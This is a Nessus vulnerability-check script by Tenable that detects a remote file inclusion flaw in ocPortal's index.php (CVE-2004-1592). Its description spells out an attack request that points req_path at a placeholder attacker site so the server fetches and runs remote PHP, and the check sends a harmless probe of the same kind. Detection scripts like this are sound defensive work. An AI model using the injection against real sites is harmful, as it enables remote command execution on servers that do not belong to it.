#
# (C) Tenable Network Security
#
#

if (description)
{
 script_id(15468);
 script_cve_id("CVE-2004-1592");
 script_bugtraq_id(11368);
 script_version ("$Revision: 1.4 $");

 script_name(english:"ocPortal Remote File Include");
 desc["english"] = "
The remote host is running ocPortal, a content management system
written in PHP.

There is a bug in the remote version of this software which may allow
an attacker to execute arbitrary commands on the remote host by using
a file inclusion bug in the file 'index.php'.

An attacker may execute arbitrary commands by requesting :

	http://www.example.com/index.php?req_path=http://[evilsite]/


which will make the remote script include the file 'funcs.php' on the remote
site and execute it.


Solution : Upgrade the newest version of this software
Risk factor : High";

 script_description(english:desc["english"]);
 script_summary(english:"Determines if ocPortal can include third-party files");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

foreach d (cgi_dirs())
{
 url = string(d, "/index.php?req_path=http://xxxxxx./");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if( buf == NULL ) exit(0);
 if ( "http://xxxxxx./funcs.php" >< buf )
 {
  security_hole(port);
  exit(0);
 }
}
